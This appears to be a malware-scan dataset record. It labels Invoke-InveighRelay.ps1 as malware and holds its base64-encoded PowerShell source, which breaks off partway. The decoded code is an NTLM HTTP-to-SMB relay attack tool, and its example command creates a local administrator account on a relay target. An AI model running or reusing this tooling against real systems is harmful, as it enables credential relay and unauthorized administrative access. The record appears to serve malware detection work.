Invoke-InveighRelay.ps1,ee1df643e9e1baad88bf2c486aa76218,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLUludmVpZ2hSZWxheQp7CjwjCi5TWU5PUFNJUwpJbnZva2UtSW52ZWlnaFJlbGF5IHBlcmZvcm1zIE5UTE12MiBIVFRQIHRvIFNNQiByZWxheSB3aXRoIHBzZXhlYyBzdHlsZSBjb21tYW5kIGV4ZWN1dGlvbi4KCi5ERVNDUklQVElPTgpJbnZva2UtSW52ZWlnaFJlbGF5IGN1cnJlbnRseSBzdXBwb3J0cyBOVExNdjIgSFRUUCB0byBTTUIgcmVsYXkgd2l0aCBwc2V4ZWMgc3R5bGUgY29tbWFuZCBleGVjdXRpb24uCgogICAgSFRUUC9IVFRQUyB0byBTTUIgTlRMTXYyIHJlbGF5IHdpdGggZ3JhbnVsYXIgY29udHJvbAogICAgTlRMTXYxL05UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZSBvdmVyIEhUVFAvSFRUUFMKICAgIEdyYW51bGFyIGNvbnRyb2wgb2YgY29uc29sZSBhbmQgZmlsZSBvdXRwdXQKICAgIENhbiBiZSBleGVjdXRlZCBhcyBlaXRoZXIgYSBzdGFuZGFsb25lIGZ1bmN0aW9uIG9yIHRocm91Z2ggSW52b2tlLUludmVpZ2gKCi5QQVJBTUVURVIgSFRUUApEZWZhdWx0ID0gRW5hYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgSFRUUCBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZS4KCi5QQVJBTUVURVIgSFRUUFMKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBIVFRQUyBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZS4gV2FybmluZywgYSBjZXJ0IHdpbGwgYmUgaW5zdGFsbGVkIGluCnRoZSBsb2NhbCBzdG9yZSBhbmQgYXR0YWNoZWQgdG8gcG9ydCA0NDMuIElmIHRoZSBzY3JpcHQgZG9lcyBub3QgZXhpdCBncmFjZWZ1bGx5LCBleGVjdXRlCiJuZXRzaCBodHRwIGRlbGV0ZSBzc2xjZXJ0IGlwcG9ydD0wLjAuMC4wOjQ0MyIgYW5kIG1hbnVhbGx5IHJlbW92ZSB0aGUgY2VydGlmaWNhdGUgZnJvbSAiTG9jYWwgQ29tcHV0ZXJcUGVyc29uYWwiCmluIHRoZSBjZXJ0IHN0b3JlLgoKLlBBUkFNRVRFUiBIVFRQU0NlcnRBcHBJRApTcGVjaWZ5IGEgdmFsaWQgYXBwbGljYXRpb24gR1VJRCBmb3IgdXNlIHdpdGggdGhlIGNlcml0aWNhdGUuCgouUEFSQU1FVEVSIEhUVFBTQ2VydFRodW1icHJpbnQKU3BlY2lmeSBhIGNlcnRpZmljYXRlIHRodW1icHJpbnQgZm9yIHVzZSB3aXRoIGEgY3VzdG9tIGNlcnRpZmljYXRlLiBUaGUgY2VydGlmaWNhdGUgZmlsZW5hbWUgbXVzdCBiZSBsb2NhdGVkIGluCnRoZSBjdXJyZW50IHdvcmtpbmcgZGlyZWN0b3J5IGFuZCBuYW1lZCBJbnZlaWdoLnBmeC4KCi5QQVJBTUVURVIgQ2hhbGxlbmdlCkRlZmF1bHQgPSBSYW5kb206IFNwZWNpZnkgYSAxNiBjaGFyYWN0ZXIgaGV4IE5UTE0gY2hhbGxlbmdlIGZvciB1c2Ugd2l0aCB0aGUgSFRUUCBsaXN0ZW5lci4gSWYgbGVmdCBibGFuaywgYQpyYW5kb20gY2hhbGxlbmdlIHdpbGwgYmUgZ2VuZXJhdGVkIGZvciBlYWNoIHJlcXVlc3QuIE5vdGUgdGhhdCBkdXJpbmcgU01CIHJlbGF5IGF0dGVtcHRzLCB0aGUgY2hhbGxlbmdlIHdpbGwgYmUKcHVsbGVkIGZyb20gdGhlIFNNQiByZWxheSB0YXJnZXQuIAoKLlBBUkFNRVRFUiBNYWNoaW5lQWNjb3VudHMKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBzaG93aW5nIE5UTE0gY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVzIGZyb20gbWFjaGluZSBhY2NvdW50cy4KCi5QQVJBTUVURVIgV1BBREF1dGgKRGVmYXVsdCA9IE5UTE06IChBbm9ueW1vdXMsTlRMTSkgU3BlY2lmeSB0aGUgSFRUUC9IVFRQUyBzZXJ2ZXIgYXV0aGVudGljYXRpb24gdHlwZSBmb3Igd3BhZC5kYXQgcmVxdWVzdHMuIFNldHRpbmcKdG8gQW5vbnltb3VzIGNhbiBwcmV2ZW50IGJyb3dzZXIgbG9naW4gcHJvbXB0cy4KCi5QQVJBTUVURVIgU01CUmVsYXlUYXJnZXQKSVAgYWRkcmVzcyBvZiBzeXN0ZW0gdG8gdGFyZ2V0IGZvciBTTUIgcmVsYXkuCgouUEFSQU1FVEVSIFNNQlJlbGF5Q29tbWFuZApDb21tYW5kIHRvIGV4ZWN1dGUgb24gU01CIHJlbGF5IHRhcmdldC4gVXNlIFBvd2VyU2hlbGwgY2hhcmFjdGVyIGVzY2FwZXMgd2hlcmUgbmVjZXNzYXJ5LgoKLlBBUkFNRVRFUiBTTUJSZWxheVVzZXJuYW1lcwpEZWZhdWx0ID0gQWxsIFVzZXJuYW1lczogQ29tbWEgc2VwYXJhdGVkIGxpc3Qgb2YgdXNlcm5hbWVzIHRvIHVzZSBmb3IgcmVsYXkgYXR0YWNrcy4gQWNjZXB0cyBib3RoIHVzZXJuYW1lIGFuZApkb21haW5cdXNlcm5hbWUgZm9ybWF0LiAKCi5QQVJBTUVURVIgU01CUmVsYXlBdXRvRGlzYWJsZQpEZWZhdWx0ID0gRW5hYmxlOiAoWS9OKSBBdXRvbWF0aWNhbHkgZGlzYWJsZSBTTUIgcmVsYXkgYWZ0ZXIgYSBzdWNjZXNzZnVsIGNvbW1hbmQgZXhlY3V0aW9uIG9uIHRhcmdldC4KCi5QQVJBTUVURVIgU01CUmVsYXlOZXR3b3JrVGltZW91dApEZWZhdWx0ID0gTm8gVGltZW91dDogKEludGVnZXIpIFNldCB0aGUgZHVyYXRpb24gaW4gc2Vjb25kcyB0aGF0IEludmVpZ2ggd2lsbCB3YWl0IGZvciBhIHJlcGx5IGZyb20gdGhlIFNNQiByZWxheQp0YXJnZXQgYWZ0ZXIgZWFjaCBwYWNrZXQgaXMgc2VudC4KCi5QQVJBTUVURVIgQ29uc29sZU91dHB1dApEZWZhdWx0ID0gRGlzYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIHJlYWwgdGltZSBjb25zb2xlIG91dHB1dC4gSWYgdXNpbmcgdGhpcyBvcHRpb24gdGhyb3VnaCBhIHNoZWxsLCB0ZXN0IHRvCmVuc3VyZSB0aGF0IGl0IGRvZXNuJ3QgaGFuZyB0aGUgc2hlbGwuCgouUEFSQU1FVEVSIEZpbGVPdXRwdXQKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSByZWFsIHRpbWUgZmlsZSBvdXRwdXQuCgouUEFSQU1FVEVSIFN0YXR1c091dHB1dApEZWZhdWx0ID0gRW5hYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgc3RhcnR1cCBhbmQgc2h1dGRvd24gbWVzc2FnZXMuCgouUEFSQU1FVEVSIE91dHB1dFN0cmVhbU9ubHkKRGVmYXVsdCA9IERpc2FibGVkOiBFbmFibGUvRGlzYWJsZSBmb3JjaW5nIGFsbCBvdXRwdXQgdG8gdGhlIHN0YW5kYXJkIG91dHB1dCBzdHJlYW0uIFRoaXMgY2FuIGJlIGhlbHBmdWwgaWYKcnVubmluZyBJbnZlaWdoIFJlbGF5IHRocm91Z2ggYSBzaGVsbCB0aGF0IGRvZXMgbm90IHJldHVybiBvdGhlciBvdXRwdXQgc3RyZWFtcy4gTm90ZSB0aGF0IHlvdSB3aWxsIG5vdCBzZWUgdGhlCnZhcmlvdXMgeWVsbG93IHdhcm5pbmcgbWVzc2FnZXMgaWYgZW5hYmxlZC4KCi5QQVJBTUVURVIgT3V0cHV0RGlyCkRlZmF1bHQgPSBXb3JraW5nIERpcmVjdG9yeTogU2V0IGEgdmFsaWQgcGF0aCB0byBhbiBvdXRwdXQgZGlyZWN0b3J5IGZvciBsb2cgYW5kIGNhcHR1cmUgZmlsZXMuIEZpbGVPdXRwdXQgbXVzdAphbHNvIGJlIGVuYWJsZWQuCgouUEFSQU1FVEVSIFJ1blRpbWUKKEludGVnZXIpIFNldCB0aGUgcnVuIHRpbWUgZHVyYXRpb24gaW4gbWludXRlcy4KCi5QQVJBTUVURVIgU2hvd0hlbHAKRGVmYXVsdCA9IEVuYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIHRoZSBoZWxwIG1lc3NhZ2VzIGF0IHN0YXJ0dXAuCgouUEFSQU1FVEVSIFRvb2wKRGVmYXVsdCA9IDA6ICgwLDEsMikgRW5hYmxlL0Rpc2FibGUgZmVhdHVyZXMgZm9yIGJldHRlciBvcGVyYXRpb24gdGhyb3VnaCBleHRlcm5hbCB0b29scyBzdWNoIGFzIE1ldGFzcGxvaXQncwpJbnRlcmFjdGl2ZSBQb3dlcnNoZWxsIFNlc3Npb25zIGFuZCBFbXBpcmUuIDAgPSBOb25lLCAxID0gTWV0YXNwbG9pdCwgMiA9IEVtcGlyZSAgCgouRVhBTVBMRQpJbnZva2UtSW52ZWlnaFJlbGF5IC1TTUJSZWxheVRhcmdldCAxOTIuMTY4LjIuNTUgLVNNQlJlbGF5Q29tbWFuZCAibmV0IHVzZXIgRGF2ZSBTcHJpbmcyMDE2IC9hZGQgJiYgbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgRGF2ZSAvYWRkIgpFeGVjdXRlIHdpdGggU01CIHJlbGF5IGVuYWJsZWQgd2l0aCBhIGNvbW1hbmQgdGhhdCB3aWxsIGNyZWF0ZSBhIGxvY2FsIGFkbWluaXN0cmF0b3IgYWNjb3VudCBvbiB0aGUgU01CIHJlbGF5CnRhcmdldC4KCi5MSU5LCmh0dHBzOi8vZ2l0aHViLmNvbS9LZXZpbi1Sb2JlcnRzb24vSW52ZWlnaAojPgoKIyBQYXJhbWV0ZXIgZGVmYXVsdCB2YWx1ZXMgY2FuIGJlIG1vZGlmaWVkIGluIHRoaXMgc2VjdGlvbjoKW0NtZGxldEJpbmRpbmcoKV0KcGFyYW0KKCAKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJEhUVFA9IlkiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kSFRUUFM9Ik4iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kQ29uc29sZU91dHB1dD0iTiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRGaWxlT3V0cHV0PSJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJFN0YXR1c091dHB1dD0iWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRPdXRwdXRTdHJlYW1Pbmx5PSJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJE1hY2hpbmVBY2NvdW50cz0iTiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRTaG93SGVscD0iWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRTTUJSZWxheUF1dG9EaXNhYmxlPSJZIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJBbm9ueW1vdXMiLCJOVExNIildW1N0cmluZ10kV1BBREF1dGg9Ik5UTE0iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIjAiLCIxIiwiMiIpXVtTdHJpbmddJFRvb2w9IjAiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTY3JpcHQoe1Rlc3QtUGF0aCAkX30pXVtTdHJpbmddJE91dHB1dERpcj0iIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV1bVmFsaWRhdGVTY3JpcHQoeyRfIC1tYXRjaCBbU3lzdGVtLk5ldC5JUEFkZHJlc3NdJF99KV1bU3RyaW5nXSRTTUJSZWxheVRhcmdldCA9IiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVBhdHRlcm4oJ15bQS1GYS1mMC05XXsxNn0kJyldW1N0cmluZ10kQ2hhbGxlbmdlPSIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bQXJyYXldJFNNQlJlbGF5VXNlcm5hbWVzPSIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bSW50XSRTTUJSZWxheU5ldHdvcmtUaW1lb3V0PSIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bSW50XSRSdW5UaW1lPSIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUpXVtTdHJpbmddJFNNQlJlbGF5Q29tbWFuZCA9ICIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3RyaW5nXSRIVFRQU0NlcnRBcHBJRD0iMDAxMTIyMzMtNDQ1NS02Njc3LTg4OTktQUFCQkNDRERFRUZGIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N0cmluZ10kSFRUUFNDZXJ0VGh1bWJwcmludD0iOThjMWQ1NDg0MGM1YzEyY2VkNzEwNzU4YjZlZTU2Y2M2MmZhMWYwZCIsCiAgICBbcGFyYW1ldGVyKFZhbHVlRnJvbVJlbWFpbmluZ0FyZ3VtZW50cz0kdHJ1ZSldJGludmFsaWRfcGFyYW1ldGVyCikKCmlmICgkaW52YWxpZF9wYXJhbWV0ZXIpCnsKICAgIHRocm93ICIkKCRpbnZhbGlkX3BhcmFtZXRlcikgaXMgbm90IGEgdmFsaWQgcGFyYW1ldGVyLiIKfQoKaWYoISRTTUJSZWxheVRhcmdldCkKewogICAgdGhyb3cgIllvdSBtdXN0IHNwZWNpZnkgYW4gLVNNQlJlbGF5VGFyZ2V0IGlmIGVuYWJsaW5nIC1TTUJSZWxheSIKfQoKaWYoISRTTUJSZWxheUNvbW1hbmQpCnsKICAgIHRocm93ICJZb3UgbXVzdCBzcGVjaWZ5IGFuIC1TTUJSZWxheUNvbW1hbmQgaWYgZW5hYmxpbmcgLVNNQlJlbGF5Igp9CgppZighJE91dHB1dERpcikKeyAKICAgICRvdXRwdXRfZGlyZWN0b3J5ID0gJFBXRC5QYXRoCn0KZWxzZQp7CiAgICAkb3V0cHV0X2RpcmVjdG9yeSA9ICRPdXRwdXREaXIKfQoKaWYoISRpbnZlaWdoKQp7CiAgICAkZ2xvYmFsOmludmVpZ2ggPSBbSGFzaFRhYmxlXTo6U3luY2hyb25pemVkKEB7fSkKICAgICRpbnZlaWdoLmxvZyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guTlRMTXYxX2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLk5UTE12MV91c2VybmFtZV9saXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5OVExNdjJfbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guTlRMTXYyX3VzZXJuYW1lX2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLmNsZWFydGV4dF9saXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLlNNQlJlbGF5X2ZhaWxlZF9saXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0Cn0KCmlmKCRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuSXNMaXN0ZW5pbmcpCnsKICAgICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuU3RvcCgpCiAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLkNsb3NlKCkKfQoKaWYoISRpbnZlaWdoLnJ1bm5pbmcpCnsKICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLk5UTE12MV9maWxlX3F1ZXVlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guY2VydGlmaWNhdGVfYXBwbGljYXRpb25fSUQgPSAkSFRUUFNDZXJ0QXBwSUQKICAgICRpbnZlaWdoLmNlcnRpZmljYXRlX3RodW1icHJpbnQgPSAkSFRUUFNDZXJ0VGh1bWJwcmludAogICAgJGludmVpZ2guSFRUUF9jaGFsbGVuZ2VfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0ID0gJGZhbHNlCiAgICAkaW52ZWlnaC5jb25zb2xlX2lucHV0ID0gJHRydWUKICAgICRpbnZlaWdoLmZpbGVfb3V0cHV0ID0gJGZhbHNlCiAgICAkaW52ZWlnaC5sb2dfb3V0X2ZpbGUgPSAkb3V0cHV0X2RpcmVjdG9yeSArICJcSW52ZWlnaC1Mb2cudHh0IgogICAgJGludmVpZ2guTlRMTXYxX291dF9maWxlID0gJG91dHB1dF9kaXJlY3RvcnkgKyAiXEludmVpZ2gtTlRMTXYxLnR4dCIKICAgICRpbnZlaWdoLk5UTE12Ml9vdXRfZmlsZSA9ICRvdXRwdXRfZGlyZWN0b3J5ICsgIlxJbnZlaWdoLU5UTE12Mi50eHQiCiAgICAkSW52ZWlnaC5jaGFsbGVuZ2UgPSAkQ2hhbGxlbmdlCn0KCiRpbnZlaWdoLnJlbGF5X3J1bm5pbmcgPSAkdHJ1ZQokaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiRpbnZlaWdoLlNNQl9yZWxheSA9ICR0cnVlCgppZigkU3RhdHVzT3V0cHV0IC1lcSAnWScpCnsKICAgICRpbnZlaWdoLnN0YXR1c19vdXRwdXQgPSAkdHJ1ZQp9CmVsc2UKewogICAgJGludmVpZ2guc3RhdHVzX291dHB1dCA9ICRmYWxzZQp9CgppZigkT3V0cHV0U3RyZWFtT25seSAtZXEgJ1knKQp7CiAgICAkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkgPSAkdHJ1ZQp9CmVsc2UKewogICAgJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5ID0gJGZhbHNlCn0KCmlmKCRUb29sIC1lcSAxKSAjIE1ldGFzcGxvaXQgSW50ZXJhY3RpdmUgUG93ZXJzaGVsbAp7CiAgICAkaW52ZWlnaC50b29sID0gMQogICAgJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5ID0gJHRydWUKICAgICRpbnZlaWdoLm5ld2xpbmUgPSAiIgogICAgJENvbnNvbGVPdXRwdXQgPSAiTiIKfQplbHNlaWYoJFRvb2wgLWVxIDIpICMgUG93ZXJTaGVsbCBFbXBpcmUKewogICAgJGludmVpZ2gudG9vbCA9IDIKICAgICRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSA9ICR0cnVlCiAgICAkaW52ZWlnaC5jb25zb2xlX2lucHV0ID0gJGZhbHNlCiAgICAkaW52ZWlnaC5uZXdsaW5lID0gImBuIgogICAgJENvbnNvbGVPdXRwdXQgPSAiWSIKICAgICRTaG93SGVscCA9ICJOIgp9CmVsc2UKewogICAgJGludmVpZ2gudG9vbCA9IDAKICAgICRpbnZlaWdoLm5ld2xpbmUgPSAiIgp9CgojIFdyaXRlIHN0YXJ0dXAgbWVzc2FnZXMKaWYoISRpbnZlaWdoLnJ1bm5pbmcpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkludmVpZ2ggUmVsYXkgc3RhcnRlZCBhdCAkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSIpID4gJG51bGwKICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEludmVpZ2ggUmVsYXkgc3RhcnRlZCIpXSkgPiAkbnVsbAoKICAgIGlmKCRIVFRQIC1lcSAnWScpCiAgICB7CiAgICAgICAgJGludmVpZ2guSFRUUCA9ICR0cnVlCiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUCBDYXB0dXJlIEVuYWJsZWQiKSAgPiAkbnVsbAogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRpbnZlaWdoLkhUVFAgPSAkZmFsc2UKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJIVFRQIENhcHR1cmUgRGlzYWJsZWQiKSAgPiAkbnVsbAogICAgfQoKICAgIGlmKCRIVFRQUyAtZXEgJ1knKQogICAgewoKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLkhUVFBTID0gJHRydWUKICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Llg1MDlDZXJ0aWZpY2F0ZXMuWDUwOVN0b3JlKCJNeSIsIkxvY2FsTWFjaGluZSIpCiAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZS5PcGVuKCdSZWFkV3JpdGUnKQogICAgICAgICAgICAkY2VydGlmaWNhdGUgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuWDUwOUNlcnRpZmljYXRlcy5YNTA5Q2VydGlmaWNhdGUyCiAgICAgICAgICAgICRjZXJ0aWZpY2F0ZS5JbXBvcnQoJFBXRC5QYXRoICsgIlxJbnZlaWdoLnBmeCIpCiAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZS5BZGQoJGNlcnRpZmljYXRlKSAKICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLkNsb3NlKCkKICAgICAgICAgICAgJG5ldHNoX2NlcnRoYXNoID0gImNlcnRoYXNoPSIgKyAkaW52ZWlnaC5jZXJ0aWZpY2F0ZV90aHVtYnByaW50CiAgICAgICAgICAgICRuZXRzaF9hcHBfSUQgPSAiYXBwaWQ9eyIgKyAkaW52ZWlnaC5jZXJ0aWZpY2F0ZV9hcHBsaWNhdGlvbl9JRCArICJ9IgogICAgICAgICAgICAkbmV0c2hfYXJndW1lbnRzID0gQCgiaHR0cCIsImFkZCIsInNzbGNlcnQiLCJpcHBvcnQ9MC4wLjAuMDo0NDMiLCRuZXRzaF9jZXJ0aGFzaCwkbmV0c2hfYXBwX0lEKQogICAgICAgICAgICAmICJuZXRzaCIgJG5ldHNoX2FyZ3VtZW50cyA+ICRudWxsCiAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFBTIENhcHR1cmUgRW5hYmxlZCIpICA+ICRudWxsCiAgICAgICAgfQogICAgICAgIGNhdGNoCiAgICAgICAgewogICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUuQ2xvc2UoKQogICAgICAgICAgICAkSFRUUFM9Ik4iCiAgICAgICAgICAgICRpbnZlaWdoLkhUVFBTID0gJGZhbHNlCiAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFBTIENhcHR1cmUgRGlzYWJsZWQgRHVlIFRvIENlcnRpZmljYXRlIEluc3RhbGwgRXJyb3IiKSAgPiAkbnVsbAogICAgICAgIH0KCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUFMgQ2FwdHVyZSBEaXNhYmxlZCIpICA+ICRudWxsCiAgICB9CgogICAgaWYoJENoYWxsZW5nZSkKICAgIHsKICAgICAgICAkSW52ZWlnaC5jaGFsbGVuZ2UgPSAkY2hhbGxlbmdlCiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiTlRMTSBDaGFsbGVuZ2UgPSAkQ2hhbGxlbmdlIikgID4gJG51bGwKICAgIH0KCiAgICBpZigkTWFjaGluZUFjY291bnRzIC1lcSAnTicpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSWdub3JpbmcgTWFjaGluZSBBY2NvdW50cyIpID4gJG51bGwKICAgICAgICAkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzID0gJGZhbHNlCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyA9ICR0cnVlCiAgICB9CgogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiRm9yY2UgV1BBRCBBdXRoZW50aWNhdGlvbiA9ICRXUEFEQXV0aCIpID4gJG51bGwKCiAgICBpZigkQ29uc29sZU91dHB1dCAtZXEgJ1knKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJlYWwgVGltZSBDb25zb2xlIE91dHB1dCBFbmFibGVkIikgPiAkbnVsbAogICAgICAgICRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0ID0gJHRydWUKICAgIH0KICAgIGVsc2UKICAgIHsKCiAgICAgICAgaWYoJGludmVpZ2gudG9vbCAtZXEgMSkKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJlYWwgVGltZSBDb25zb2xlIE91dHB1dCBEaXNhYmxlZCBEdWUgVG8gRXh0ZXJuYWwgVG9vbCBTZWxlY3Rpb24iKSA+ICRudWxsCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJlYWwgVGltZSBDb25zb2xlIE91dHB1dCBEaXNhYmxlZCIpID4gJG51bGwKICAgICAgICB9CgogICAgfQoKICAgIGlmKCRGaWxlT3V0cHV0IC1lcSAnWScpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUmVhbCBUaW1lIEZpbGUgT3V0cHV0IEVuYWJsZWQiKSA+ICRudWxsCiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiT3V0cHV0IERpcmVjdG9yeSA9ICRvdXRwdXRfZGlyZWN0b3J5IikgPiAkbnVsbAogICAgICAgICRpbnZlaWdoLmZpbGVfb3V0cHV0ID0gJHRydWUKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJSZWFsIFRpbWUgRmlsZSBPdXRwdXQgRGlzYWJsZWQiKSA+ICRudWxsCiAgICB9CgogICAgaWYoJFJ1blRpbWUgLWVxIDEpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUnVuIFRpbWUgPSAkUnVuVGltZSBNaW51dGUiKSA+ICRudWxsCiAgICB9CiAgICBlbHNlaWYoJFJ1blRpbWUg